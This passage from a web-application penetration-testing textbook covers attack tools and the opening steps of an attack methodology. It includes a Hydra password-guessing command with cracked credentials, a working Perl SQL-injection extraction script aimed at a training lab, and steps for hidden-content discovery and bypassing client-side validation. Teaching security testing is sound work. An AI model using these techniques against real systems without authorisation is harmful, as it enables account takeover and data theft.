when you have direct feedback about the scanner‚Äôs activity, you can ensure 
that problems with authentication and session handling are avoided and that 
issues caused by multistage processes and stateful functions are handled 
properly. By using a scanner in this way, you can cover an important range 
of vulnerabilities whose detection can be automated. This will free you to 
look for the types of vulnerabilities that require human intelligence and 
experience to uncover.
c20.indd 784 c20.indd 784 8/19/2011 12:21:11 PM 8/19/2011 12:21:11 PM
Stuttard c20.indd V3 - 08/16/2011 Page 785
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 785
Other Tools
In addition to the tools already discussed, you may fi nd countless others useful in a specifi c situation or to perform a particular task. The remainder of this 
chapter describes a few other tools you are likely to encounter and use when 
attacking applications. It should be noted that this is only a brief survey of 
some tools that the authors have used. It is recommended that you investigate 
the various tools available for yourself, and choose those which best meet your 
needs and testing style.
Wikto/Nikto
Nikto is useful for locating default or common third-party content that exists 
on a web server. It contains a large database of fi les and directories, including 
default pages and scripts that ship with web servers, and third-party items such 
as shopping cart software. The tool essentially works by requesting each item 
in turn and detecting whether it exists.
The database is updated frequently, meaning that Nikto typically is more 
effective than any other automated or manual technique for identifying this 
type of content.
Nikto implements a wide range of confi guration options, which can be specifi ed on the command line or via a text-based confi guration fi le. If the application 
uses a customized ‚Äúnot found‚Äù page, you can avoid false positives by using the 
-404 setting, which enables you to specify a string that appears in the custom 
error page.
Wikto is a Windows version of Nikto that has some additional features, such 
as enhanced detection of custom ‚Äúnot-found‚Äù responses and Google-assisted 
directory mining.
Firebug
Firebug is a browser debugging tool that lets you debug and edit HTML and 
JavaScript in real time on the currently displayed page. You can also explore 
and edit the DOM.
Firebug is extremely powerful for analyzing and exploiting a wide range of 
client-side attacks, including all kinds of cross-site scripting, request forgery 
and UI redress, and cross-domain data capture, as described in Chapter 13.
Hydra
Hydra is a password-guessing tool that can be used in a wide range of situations, including with the forms-based authentication commonly used in web 
c20.indd 785 c20.indd 785 8/19/2011 12:21:11 PM 8/19/2011 12:21:11 PM
Stuttard c20.indd V3 - 08/16/2011 Page 786
786 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
applications. Of course, you can use a tool such as Burp Intruder to execute any 
attack of this kind in a completely customized way; however, in many situations 
Hydra can be just as useful.
Hydra enables you to specify the target URL, the relevant request parameters, 
word lists for attacking the username and password fi elds, and details of the error 
message that is returned following an unsuccessful login. The -t setting can be 
used to specify the number of parallel threads to use in the attack. For example:
C:\>hydra.exe ‚Äìt 32 -L user.txt -P password.txt wahh-app.com http-post-form
 ‚Äú/login.asp:login_name=^USER^&login_password=^PASS^&login=Login:Invalid‚Äù
Hydra v6.4 (c) 2011 by van Hauser / THC - use allowed only for legal 
purposes.
Hydra (http://www.thc.org) starting at 2011-05-22 16:32:48
[DATA] 32 tasks, 1 servers, 21904 login tries (l:148/p:148), ~684 tries per 
task
[DATA] attacking service http-post-form on port 80
 [STATUS] 397.00 tries/min, 397 tries in 00:01h, 21507 todo in 00:55h
 [80][www-form] host: 65.61.137.117 login: alice password: password
 [80][www-form] host: 65.61.137.117 login: liz password: password
...
Custom Scripts
In the authors‚Äô experience, the various off-the-shelf tools that exist are suffi cient 
to help you perform the vast majority of tasks that you need to carry out when 
attacking a web application. However, in various unusual situations you will 
need to create your own customized tools and scripts to address a particular 
problem. For example:
n The application uses an unusual session-handling mechanism, such as one that 
involves per-page tokens that must be resubmitted in the correct sequence.
n You want to exploit a vulnerability that requires several specifi c steps to be 
performed repeatedly, with data retrieved on one response incorporated 
into subsequent requests.
n The application aggressively terminates your session when it identifi es a 
potentially malicious request, and acquiring a fresh authenticated session 
requires several nonstandard steps.
n You need to provide a ‚Äúpoint and click‚Äù exploit to an application owner 
to demonstrate the vulnerability and the risk.
If you have some programming experience, the easiest way to address problems of this kind is to create a small, fully customized program to issue the 
relevant requests and process the application‚Äôs responses. You can produce this 
either as a standalone tool or as an extension to one of the integrated testing 
c20.indd 786 c20.indd 786 8/19/2011 12:21:12 PM 8/19/2011 12:21:12 PM
Stuttard c20.indd V3 - 08/16/2011 Page 787
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 787
suites described earlier. For example, you can use the Burp Extender interface 
to extend Burp Suite or the BeanShell interface to extend WebScarab.
Scripting languages such as Perl contain libraries to help make HTTP communication straightforward, and you often can carry out customized tasks using 
only a few lines of code. Even if you have limited programming experience, you 
often can fi nd a script on the Internet that you can tweak to meet your requirements. The following example shows a simple Perl script that exploits a SQL 
injection vulnerability in a search form to make recursive queries and retrieve 
all the values in a specifi ed table column. It starts with the highest value and 
iterates downward (see Chapter 9 for more details on this kind of attack):
use HTTP::Request::Common;
use LWP::UserAgent;
$ua = LWP::UserAgent->new();
my $col = @ARGV[1];
my $from_stmt = @ARGV[3];
if ($#ARGV!=3) {
 print ‚Äúusage: perl sql.pl SELECT column FROM table\n‚Äù;
 exit;
 }
while(1)
{
$payload = ‚Äúfoo‚Äô or (1 in (select max($col) from $from_stmt 
$test))--‚Äù;
my $req = POST ‚Äúhttp://mdsec.net/addressbook/32/Default.aspx‚Äù,
 [__VIEWSTATE => ‚Äò‚Äô, Name => $payload, Email => ‚Äòjohn@test.
com‚Äô, Phone =>
 ‚Äò12345‚Äô, Search => ‚ÄòSearch‚Äô, Address => ‚Äò1 High Street‚Äô, Age => 
‚Äò30‚Äô,];
my $resp = $ua->request($req);
my $content = $resp->as_string;
#print $content;
if ($content =~ /nvarchar value ‚Äò(.*)‚Äô/)
{
 print ‚Äú$1\n‚Äù; # print the extracted match
}
else
 {exit;}
$test = ‚Äúwhere $col < ‚Äò$1‚Äô‚Äù;
}
c20.indd 787 c20.indd 787 8/19/2011 12:21:12 PM 8/19/2011 12:21:12 PM
Stuttard c20.indd V3 - 08/16/2011 Page 788
788 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
TRY IT!
http://mdsec.net/addressbook/32/
In addition to built-in commands and libraries, you can call out to various 
simple tools and utilities from Perl scripts and operating system shell scripts. 
Some tools that are useful for this purpose are described next.
Wget
Wget is a handy tool for retrieving a specifi ed URL using HTTP or HTTPS. 
It can support a downstream proxy, HTTP authentication, and various other 
confi guration options.
Curl
Curl is one of the most fl exible command-line tools for issuing HTTP and HTTPS 
requests. It supports GET and POST methods, request parameters, client SSL 
certifi cates, and HTTP authentication. In the following example, the page title 
is retrieved for page ID values between 10 and 40:
#!/bin/bash
for i in `seq 10 40`;
do
echo -n $i ‚Äú: ‚Äú
 curl -s http://mdsec.net/app/ShowPage.ashx?PageNo==$i | grep -Po
 ‚Äú<title>(.*)</title>‚Äù | sed ‚Äòs/.......\(.*\)......../\1/‚Äô
done
TRY IT!
http://mdsec.net/app/
Netcat
Netcat is a versatile tool that can be used to perform numerous network-related 
tasks. It is a cornerstone of many beginners‚Äô hacking tutorials. You can use it to 
open a TCP connection to a server, send a request, and retrieve the response. 
In addition to this use, Netcat can be used to create a network listener on your 
computer to receive connections from a server you are attacking. See Chapter 9 
c20.indd 788 c20.indd 788 8/19/2011 12:21:12 PM 8/19/2011 12:21:12 PM
Stuttard c20.indd V3 - 08/16/2011 Page 789
 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 789
for an example of this technique being used to create an out-of-band channel 
in a database attack.
Netcat does not itself support SSL connections, but this can be achieved if 
you use it in combination with the stunnel tool, described next.
Stunnel
Stunnel is useful when you are working with your own scripts or other tools 
that do not themselves support HTTPS connections. Stunnel enables you to 
create client SSL connections to any host, or server SSL sockets to listen for 
incoming connections from any client. Because HTTPS is simply the HTTP 
protocol tunneled over SSL, you can use stunnel to provide HTTPS capabilities to any other tool.
For example, the following command shows stunnel being confi gured to create a simple TCP server socket on port 88 of the local loopback interface. When 
a connection is received, stunnel performs an SSL negotiation with the server 
at wahh-app.com, forwarding the incoming cleartext connection through the 
SSL tunnel to this server:
C:\bin>stunnel -c -d localhost:88 -r wahh-app.com:443
2011.01.08 15:33:14 LOG5[1288:924]: Using ‚Äòwahh-app.com.443‚Äô as 
tcpwrapper service name
2011.01.08 15:33:14 LOG5[1288:924]: stunnel 3.20 on x86-pcmingw32-gnu WIN32
You can now simply point any tool that is not SSL-capable at port 88 on the 
loopback interface. This effectively communicates with the destination server 
over HTTPS:
2011.01.08 15:33:20 LOG5[1288:1000]: wahh-app.com.443 connected 
from 127.0.0.1:1113
2011.01.08 15:33:26 LOG5[1288:1000]: Connection closed: 16 bytes 
sent to SSL, 392 bytes sent to socket
Summary
This book has focused on the practical techniques you can use to attack web 
applications. Although you can carry out some of these tasks using only a 
browser, to perform an effective and comprehensive attack of an application, 
you need some tools.
The most important and indispensable tool in your arsenal is the intercepting 
proxy, which enables you to view and modify all traffi c passing in both directions between browser and server. Today‚Äôs proxies are supplemented with a 
c20.indd 789 c20.indd 789 8/19/2011 12:21:12 PM 8/19/2011 12:21:12 PM
Stuttard c20.indd V3 - 08/16/2011 Page 790
790 Chapter 20 n A Web Application Hacker‚Äôs Toolkit 
wealth of other integrated tools that can help automate many of the tasks you 
will need to perform. In addition to one of these tool suites, you need to use one 
or more browser extensions that enable you to continue working in situations 
where a proxy cannot be used.
The other main type of tool you may employ is a standalone web application 
scanner. These tools can be effective at quickly discovering a range of common 
vulnerabilities, and they can also help you map and analyze an application‚Äôs 
functionality. However, they are unable to identify many kinds of security 
fl aws, and you can‚Äôt rely on them to give a completely clean bill of health to 
any application.
Ultimately, what will make you an accomplished web application hacker is 
your ability to understand how web applications function, where their defenses 
break down, and how to probe them for exploitable vulnerabilities. To do this 
effectively, you need tools that enable you to look under the hood, to manipulate your interaction with applications in a fi ne-grained way, and to leverage 
automation wherever possible to make your attacks faster and more reliable. 
Whichever tools you fi nd most useful in achieving these objectives are the right 
ones for you. And if the available tools don‚Äôt meet your needs, you can always 
create your own. It isn‚Äôt that diffi cult, honest.
c20.indd 790 c20.indd 790 8/19/2011 12:21:12 PM 8/19/2011 12:21:12 PM
Stuttard c21.indd V3 - 08/16/2011 Page 791
791
C H A P T E R 
21
A Web Application Hacker‚Äôs 
Methodology
This chapter contains a detailed step-by-step methodology you can follow when 
attacking a web application. It covers all the categories of vulnerabilities and 
attack techniques described in this book. Following all the steps in this methodology will not guarantee that you discover all the vulnerabilities within a 
given application. However, it will provide you with a good level of assurance 
that you have probed all the necessary regions of the application‚Äôs attack surface 
and have found as many issues as possible given the resources available to you.
Figure 21-1 illustrates the main areas of work that this methodology describes. 
We will drill down into this diagram and illustrate the subdivision of tasks that 
each area involves. The numbers in the diagrams correspond to the hierarchical 
numbered list used in the methodology, so you can easily jump to the actions 
involved in a specifi c area.
The methodology is presented as a sequence of tasks that are organized and 
ordered according to the logical interdependencies between them. As far as possible, these interdependencies are highlighted in the task descriptions. However, 
in practice you will frequently need to think imaginatively about the direction 
in which your activities should go and allow these to be guided by what you 
discover about the application you are attacking. For example:
n Information gathered in one stage may enable you to return to an earlier 
stage and formulate more focused attacks. For example, an access control 
bug that enables you to obtain a listing of all users may enable you to 
c21.indd 791 c21.indd 791 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 792
792 Chapter 21 n A Web Application Hacker‚Äôs Methodology
perform a more effective password-guessing attack against the authentication function.
n Discovering a key vulnerability in one area of the application may enable 
you to shortcut some of the work in other areas. For example, a fi le disclosure 
vulnerability may enable to you perform a code review of key application 
functions rather than probing them in a solely black-box manner.
n The results of your testing in some areas may highlight patterns of recurring vulnerabilities that you can immediately probe for in other areas. 
For example, a generic defect in the application‚Äôs input validation fi lters 
may enable you to quickly fi nd a bypass of its defenses against several 
different categories of attack.
Figure 21-1: The main areas of work involved in the methodology
Recon and analysis
Application logic Application hosting Access handling Input handling
1. Map application content
2. Analyze the application
3. Test client-side
controls
9. Test for logic
flaws
4. Test
authentication
5. Test session
management
6. Test access
controls
12. Miscellaneous
Checks
13. Information
Leakage
7. Fuzz all
parameters
8. Test for issues
with specific
functionality
10. Test for shared
hosting issues
11. Test the web
server
Use the steps in this methodology to guide your work, and as a checklist to 
avoid oversights, but do not feel obligated to adhere to them too rigidly. Keep 
c21.indd 792 c21.indd 792 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 793
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 793
the following thought in mind: the tasks we describe are largely standard and 
orthodox; the most impressive attacks against web applications always involve 
thinking beyond them.
General Guidelines
You should always keep in mind some general considerations when carrying out 
the detailed tasks involved in attacking a web application. These may apply to all 
the different areas you need to examine and techniques you need to carry out.
n Remember that several characters have special meaning in different parts 
of the HTTP request. When you are modifying the data within requests, 
you should URL-encode these characters to ensure that they are interpreted 
in the way you intend:
n & is used to separate parameters in the URL query string and message 
body. To insert a literal & character, you should encode this as %26.
n = is used to separate the name and value of each parameter in the URL 
query string and message body. To insert a literal = character, you 
should encode this as %3d.
n ? is used to mark the beginning of the URL query string. To insert a 
literal ? character, you should encode this as %3f.
n A space is used to mark the end of the URL in the fi rst line of requests 
and can indicate the end of a cookie value in the Cookie header. To 
insert a literal space, you should encode this as %20 or +.
n Because + represents an encoded space, to insert a literal + character, 
you should encode this as %2b.
n ; is used to separate individual cookies in the Cookie header. To insert 
a literal ; character, you should encode this as %3b.
n # is used to mark the fragment identifi er within the URL. If you enter 
this character into the URL within your browser, it effectively truncates 
the URL that is sent to the server. To insert a literal # character, you 
should encode this as %23.
n % is used as the prefi x in the URL-encoding scheme. To insert a literal 
% character, you should encode this as %25.
n Any nonprinting characters such as null bytes and newlines must, of 
course, be URL-encoded using their ASCII character code ‚Äî in this 
case, as %00 and %0a, respectively.
n Furthermore, note that entering URL-encoded data into a form usually 
causes your browser to perform another layer of encoding. For example, 
c21.indd 793 c21.indd 793 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 794
794 Chapter 21 n A Web Application Hacker‚Äôs Methodology
submitting %00 in a form will probably result in a value of %2500 being 
sent to the server. For this reason it is normally best to observe the fi nal 
request within an intercepting proxy.
n Many tests for common web application vulnerabilities involve sending 
various crafted input strings and monitoring the application‚Äôs responses 
for anomalies, which indicate that a vulnerability is present. In some 
cases, the application‚Äôs response to a particular request contains a signature of a particular vulnerability, regardless of whether a trigger for that 
vulnerability has been submitted. In any case where specifi c crafted input 
results in behavior associated with a vulnerability (such as a particular 
error message), you should double-check whether submitting benign 
input in the relevant parameter also causes the same behavior. If it does, 
your tentative fi nding is probably a false positive.
n Applications typically accumulate an amount of state from previous requests, 
which affects how they respond to further requests. Sometimes, when you 
are trying to investigate a tentative vulnerability and isolate the precise 
cause of a particular piece of anomalous behavior, you must remove the 
effects of any accumulated state. To do so, it is usually suffi cient to begin 
a fresh session with a new browser process, navigate to the location of the 
observed anomaly using only benign requests, and then resubmit your 
crafted input. You can often replicate this measure by adjusting the parts 
of your requests containing cookies and caching information. Furthermore, 
you can use a tool such as Burp Repeater to isolate a request, make specifi c 
adjustments to it, and reissue it as many times as you require.
n Some applications use a load-balanced confi guration in which consecutive HTTP requests may be handled by different back-end servers at the 
web, presentation, data, or other tiers. Different servers may have small 
differences in confi guration that affect your results. Furthermore, some 
successful attacks will result in a change in the state of the specifi c server 
that handles your requests ‚Äî such as the creation of a new fi le within the 
web root. To isolate the effects of particular actions, it may be necessary 
to perform several identical requests in succession, testing the result of 
each until your request is handled by the relevant server.
Assuming that you are implementing this methodology as part of a consultancy engagement, you should always be sure to carry out the usual scoping 
exercise to agree precisely which hostnames, URLs, and functionality are to 
be included, and whether any restrictions exist on the types of testing you are 
permitted to perform. You should make the application owner aware of the 
inherent risks involved in performing any kind of penetration testing against 
a black-box target. Advise the owner to back up any important data before you 
commence your work.
c21.indd 794 c21.indd 794 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 795
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 795
1 Map the Application‚Äôs Content
Figure 21-2: Mapping the application‚Äôs content
Linked content Other content Non-standard
access methods
1.1. Explore visible
content
1.2. Consult public
resources
1.3. Discover
hidden content
1.4. Discover
default content
1.5. Identifierspecified functions
1.6. Debug
parameters
1.1 Explore Visible Content
 1.1.1 Confi gure your browser to use your favorite integrated proxy/spidering 
tool. Both Burp and WebScarab can be used to passively spider the site 
by monitoring and parsing web content processed by the proxy.
 1.1.2 If you fi nd it useful, confi gure your browser to use an extension such 
as IEWatch to monitor and analyze the HTTP and HTML content being 
processed by the browser.
 1.1.3 Browse the entire application in the normal way, visiting every link and 
URL, submitting every form, and proceeding through all multistep functions to completion. Try browsing with JavaScript enabled and disabled, 
and with cookies enabled and disabled. Many applications can handle 
various browser confi gurations, and you may reach different content 
and code paths within the application.
 1.1.4 If the application uses authentication, and you have or can create a login 
account, use this to access the protected functionality.
 1.1.5 As you browse, monitor the requests and responses passing through 
your intercepting proxy to gain an understanding of the kinds of data 
being submitted and the ways in which the client is used to control the 
behavior of the server-side application.
 1.1.6 Review the site map generated by the passive spidering, and identify any 
content or functionality that you have not walked through using your 
browser. From the spider results, establish where each item was discovered (for example, in Burp Spider, check the Linked From details). Access 
each item using your browser so that the spider parses the response from 
the server to identify any further content. Continue this step recursively 
until no further content or functionality is identifi ed.
c21.indd 795 c21.indd 795 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 796
796 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 1.1.7 When you have fi nished manually browsing and passively spidering, 
you can use your spider to actively crawl the application, using the set 
of discovered URLs as seeds. This may sometimes uncover additional 
content that you overlooked when working manually. Before doing an 
automated crawl, fi rst identify any URLs that are dangerous or likely to 
break the application session, and then confi gure the spider to exclude 
these from its scope.
1.2 Consult Public Resources
 1.2.1 Use Internet search engines and archives (such as the Wayback Machine) 
to identify what content they have indexed and stored for your target 
application.
 1.2.2 Use advanced search options to improve the effectiveness of your research. 
For example, on Google you can use site: to retrieve all the content for 
your target site and link: to retrieve other sites that link to it. If your 
search identifi es content that is no longer present in the live application, 
you may still be able to view this from the search engine‚Äôs cache. This 
old content may contain links to additional resources that have not yet 
been removed.
 1.2.3 Perform searches on any names and e-mail addresses you have discovered in the application‚Äôs content, such as contact information. Include 
items not rendered on-screen, such as HTML comments. In addition to 
web searches, perform news and group searches. Look for any technical 
details posted to Internet forums regarding the target application and 
its supporting infrastructure.
 1.2.4 Review any published WSDL fi les to generate a list of function names 
and parameter values potentially employed by the application.
1.3 Discover Hidden Content
 1.3.1 Confi rm how the application handles requests for nonexistent items. 
Make some manual requests for known valid and invalid resources, 
and compare the server‚Äôs responses to establish an easy way to identify 
when an item does not exist.
 1.3.2 Obtain listings of common fi le and directory names and common fi le 
extensions. Add to these lists all the items actually observed within the 
applications, and also items inferred from these. Try to understand the 
naming conventions used by application developers. For example, if 
there are pages called AddDocument.jsp and ViewDocument.jsp, there 
may also be pages called EditDocument.jsp and RemoveDocument.jsp.
c21.indd 796 c21.indd 796 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 797
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 797
 1.3.3 Review all client-side code to identify any clues about hidden server-side 
content, including HTML comments and disabled form elements.
 1.3.4 Using the automation techniques described in Chapter 14, make large 
numbers of requests based on your directory, fi lename, and fi le extension 
lists. Monitor the server‚Äôs responses to confi rm which items are present 
and accessible.
 1.3.5 Perform these content-discovery exercises recursively, using new enumerated content and patterns as the basis for further user-directed spidering 
and further automated discovery.
1.4 Discover Default Content
 1.4.1 Run Nikto against the web server to detect any default or well-known 
content that is present. Use Nikto‚Äôs options to maximize its effectiveness. For example, you can use the ‚Äìroot option to specify a directory 
to check for default content, or -404 to specify a string that identifi es a 
custom File Not Found page.
 1.4.2 Verify any potentially interesting fi ndings manually to eliminate any 
false positives within the results.
 1.4.3 Request the server‚Äôs root directory, specifying the IP address in the 
Host header, and determine if the application responds with any different content. If so, run a Nikto scan against the IP address as well as 
the server name.
 1.4.4 Make a request to the server‚Äôs root directory, specifying a range of 
User-Agent headers, as shown at www.useragentstring.com/pages/
useragentstring.php.
1.5 Enumerate Identifi er-Specifi ed Functions
 1.5.1 Identify any instances where specifi c application functions are accessed by 
passing an identifi er of the function in a request parameter (for example, 
/admin.jsp?action=editUser or /main.php?func=A21).
 1.5.2 Apply the content discovery techniques used in step 1.3 to the mechanism 
being used to access individual functions. For example, if the application uses a parameter containing a function name, fi rst determine its 
behavior when an invalid function is specifi ed, and try to establish an 
easy way to identify when a valid function has been requested. Compile 
a list of common function names or cycle through the syntactic range of 
identifi ers observed to be in use. Automate the exercise to enumerate 
valid functionality as quickly and easily as possible.
c21.indd 797 c21.indd 797 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 798
798 Chapter 21 n A Web Application Hacker‚Äôs Methodology
 1.5.3 If applicable, compile a map of application content based on functional paths, 
rather than URLs, showing all the enumerated functions and the logical 
paths and dependencies between them. (See Chapter 4 for an example.)
1.6 Test for Debug Parameters
 1.6.1 Choose one or more application pages or functions where hidden debug 
parameters (such as debug=true) may be implemented. These are most 
likely to appear in key functionality such as login, search, and fi le upload 
or download.
 1.6.2 Use listings of common debug parameter names (such as debug, test,
hide, and source) and common values (such as true, yes, on, and 1).
Iterate through all permutations of these, submitting each name/value 
pair to each targeted function. For POST requests, supply the parameter 
in both the URL query string and the request body. Use the techniques 
described in Chapter 14 to automate this exercise. For example, you 
can use the cluster bomb attack type in Burp Intruder to combine all 
permutations of two payload lists.
 1.6.3 Review the application‚Äôs responses for any anomalies that may indicate 
that the added parameter has had an effect on the application‚Äôs processing.
2 Analyze the Application
Figure 21-3: Analyzing the application
2.4. Map the attack surface
2.1. Identify
functionality
2.2. Identify data
entry points
2.3. Identify
technologies
2.1 Identify Functionality
 2.1.1 Identify the core functionality that the application was created for and 
the actions that each function is designed to perform when used as 
intended.
 2.1.2 Identify the core security mechanisms employed by the application and 
how they work. In particular, understand the key mechanisms that handle 
c21.indd 798 c21.indd 798 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 799
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 799
authentication, session management, and access control, and the functions 
that support them, such as user registration and account recovery.
 2.1.3 Identify all the more peripheral functions and behavior, such as the use 
of redirects, off-site links, error messages, and administrative and logging functions.
 2.1.4 Identify any functionality that diverges from the standard GUI appearance, parameter naming, or navigation mechanism used elsewhere in 
the application, and single it out for in-depth testing.
2.2 Identify Data Entry Points
 2.2.1 Identify all the different entry points that exist for introducing user 
input into the application‚Äôs processing, including URLs, query string 
parameters, POST data, cookies, and other HTTP headers processed by 
the application.
 2.2.2 Examine any customized data transmission or encoding mechanisms 
used by the application, such as a nonstandard query string format. 
Understand whether the data being submitted encapsulates parameter 
names and values, or whether an alternative means of representation 
is being used.
 2.2.3 Identify any out-of-band channels via which user-controllable or other 
third-party data is being introduced into the application‚Äôs processing. 
An example is a web mail application that processes and renders messages received via SMTP.
2.3 Identify the Technologies Used
 2.3.1 Identify each of the different technologies used on the client side, such as 
forms, scripts, cookies, Java applets, ActiveX controls, and Flash objects.
 2.3.2 As far as possible, establish which technologies are being used on the 
server side, including scripting languages, application platforms, and 
interaction with back-end components such as databases and e-mail 
systems.
 2.3.3 Check the HTTP Server header returned in application responses, and 
also check for any other software identifi ers contained within custom 
HTTP headers or HTML source code comments. Note that in some cases, 
different areas of the application are handled by different back-end 
components, so different banners may be received.
 2.3.4 Run the Httprint tool to fi ngerprint the web server.
 2.3.5 Review the results of your content-mapping exercises to identify any 
interesting-looking fi le extensions, directories, or other URL subsequences 
c21.indd 799 c21.indd 799 8/19/2011 12:22:01 PM 8/19/2011 12:22:01 PM
Stuttard c21.indd V3 - 08/16/2011 Page 800
800 Chapter 21 n A Web Application Hacker‚Äôs Methodology
that may provide clues about the technologies in use on the server. 
Review the names of any session tokens and other cookies issued. Use 
Google to search for technologies associated with these items.
 2.3.6 Identify any interesting-looking script names and query string parameters 
that may belong to third-party code components. Search for these on 
Google using the inurl: qualifi er to fi nd any other applications using 
the same scripts and parameters and that therefore may be using the 
same third-party components. Perform a noninvasive review of these 
sites, because this may uncover additional content and functionality that 
is not explicitly linked on the application you are attacking.
2.4 Map the Attack Surface
 2.4.1 Try to ascertain the likely internal structure and functionality of the 
server-side application and the mechanisms it uses behind the scenes 
to deliver the behavior that is visible from the client perspective. For 
example, a function to retrieve customer orders is likely to be interacting 
with a database.
 2.4.2 For each item of functionality, identify the kinds of common vulnerabilities 
that are often associated with it. For example, fi le upload functions may 
be vulnerable to path traversal, inter-user messaging may be vulnerable 
to XSS, and Contact Us functions may be vulnerable to SMTP injection. 
See Chapter 4 for examples of vulnerabilities commonly associated with 
particular functions and technologies.
 2.4.3 Formulate a plan of attack, prioritizing the most interesting-looking 
functionality and the most serious of the potential vulnerabilities associated with it. Use your plan to guide the amount of time and effort you 
devote to each of the remaining areas of this methodology.
3 Test Client-Side Controls
Figure 21-4: Testing client-side controls
3.1. Transmission of
data via client
3.2. Client-side input
controls
3.3. Browser
Extensions
Hidden fields Length limits Java applets
ActiveX controls
Flash objects
Silverlight objects
JavaScript validation
Disabled elements
Cookies
Preset parameters
ASP.NET ViewState
c21.indd 800 c21.indd 800 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 801
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 801
3.1 Test Transmission of Data Via the Client
 3.1.1 Locate all instances within the application where hidden form fi elds, 
cookies, and URL parameters are apparently being used to transmit 
data via the client.
 3.1.2 Attempt to determine the purpose that the item plays in the application‚Äôs logic, based on the context in which it appears and on its name 
and value.
 3.1.3 Modify the item‚Äôs value in ways that are relevant to its role in the 
application‚Äôs functionality. Determine whether the application processes arbitrary values submitted in the fi eld and whether this fact 
can be exploited to interfere with the application‚Äôs logic or subvert 
any security controls.
 3.1.4 If the application transmits opaque data via the client, you can attack this 
in various ways. If the item is obfuscated, you may be able to decipher 
the obfuscation algorithm and therefore submit arbitrary data within the 
opaque item. Even if it is securely encrypted, you may be able to replay 
the item in other contexts to interfere with the application‚Äôs logic. See 
Chapter 5 for more details on these and other attacks.
 3.1.5 If the application uses the ASP.NET ViewState, test to confi rm whether 
this can be tampered with or whether it contains any sensitive information. Note that the ViewState may be used differently on different 
application pages.
 3.1.5.1 Use the ViewState analyzer in Burp Suite to confi rm whether 
the EnableViewStateMac option has been enabled, meaning 
that the ViewState‚Äôs contents cannot be modifi ed.
 3.1.5.2 Review the decoded ViewState to identify any sensitive data it 
contains.
 3.1.5.3 Modify one of the decoded parameter values and reencode and 
submit the ViewState. If the application accepts the modifi ed 
value, you should treat the ViewState as an input channel for 
introducing arbitrary data into the application‚Äôs processing. 
Perform the same testing on the data it contains as you would 
for any other request parameters.
3.2 Test Client-Side Controls Over User Input
 3.2.1 Identify any cases where client-side controls such as length limits and 
JavaScript checks are used to validate user input before it is submitted 
c21.indd 801 c21.indd 801 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 802
802 Chapter 21 n A Web Application Hacker‚Äôs Methodology
to the server. These controls can be bypassed easily, because you can 
send arbitrary requests to the server. For example:
<form action=‚Äùorder.asp‚Äù onsubmit=‚Äùreturn Validate(this)‚Äù>
<input maxlength=‚Äù3‚Äù name=‚Äùquantity‚Äù>
...
 3.2.2 Test each affected input fi eld in turn by submitting input that would 
ordinarily be blocked by the client-side controls to verify whether these 
are replicated on the server.
 3.2.3 The ability to bypass client-side validation does not necessarily represent 
any vulnerability. Nevertheless, you should review closely what validation is being performed. Confi rm whether the application is relying 
on the client-side controls to protect itself from malformed input. Also 
confi rm whether any exploitable conditions exist that can be triggered 
by such input.
 3.2.4 Review each HTML form to identify any disabled elements, such as 
grayed-out submit buttons. For example:
<input disabled=‚Äùtrue‚Äù name=‚Äùproduct‚Äù>
If you fi nd any, submit these to the server, along with the form‚Äôs other 
parameters. See whether the parameter has any effect on the server‚Äôs 
processing that you can leverage in an attack. Alternatively, use an 
automated proxy rule to automatically enable disabled fi elds, such as 
Burp Proxy‚Äôs ‚ÄúHTML Modifi cation‚Äù rules.
3.3 Test Browser Extension Components
3.3.1 Understand the Client Application‚Äôs Operation
 3.3.1.1 Set up a local intercepting proxy for the client technology under review, 
and monitor all traffi c passing between the client and server. If data is 
serialized, use a deserialization tool such as Burp‚Äôs built-in AMF support 
or the DSer Burp plug-in for Java.
 3.3.1.2 Step through the functionality presented in the client. Determine any 
potentially sensitive or powerful functions, using standard tools within 
the intercepting proxy to replay key requests or modify server responses.
3.3.2 Decompile the Client
 3.3.2.1 Identify any applets employed by the application. Look for any of the 
following fi le types being requested via your intercepting proxy:
n .class, .jar : Java
n .swf : Flash
n .xap : Silverlight
c21.indd 802 c21.indd 802 8/19/2011 12:22:02 PM 8/19/2011 12:22:02 PM
Stuttard c21.indd V3 - 08/16/2011 Page 803
 Chapter 21 n A Web Application Hacker‚Äôs Methodology 803
You can also look for applet tags within the HTML source code of 
application pages. For example:
<applet code=‚Äùinput.class‚Äù id=‚ÄùTheApplet‚Äù codebase=‚Äù/scripts/‚Äù></
applet>
 3.3.2.2 Review all calls made to the applet‚Äôs methods from within the invoking 
HTML, and determine whether data returned from the applet is being 
submitted to the server. If this data is opaque (that is, obfuscated or 
encrypted), to modify it you will probably need to decompile the applet 
to obtain its source code.
 3.3.2.3 Download the applet bytecode by entering the URL into your browser, 
and save the fi le locally. The name of the bytecode fi le is specifi ed in 
the code attribute of the applet tag. The fi le will be located in the directory specifi ed in the codebase attribute if this is present. Otherwise, it 
will be located in the same directory as the page in which the applet tag 
appears.
